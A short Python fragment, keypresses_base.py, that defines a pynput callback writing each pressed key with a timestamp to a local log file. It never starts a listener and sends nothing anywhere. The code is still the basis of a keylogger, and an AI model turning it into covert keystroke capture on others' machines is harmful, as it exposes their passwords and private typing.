# keypresses_base.py

from pynput import keyboard
import time

log_file = 'keystrokes_log.txt'

def on_key_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - {key}\n')
    except Exception as e:
        print("Error writing to file:", e)
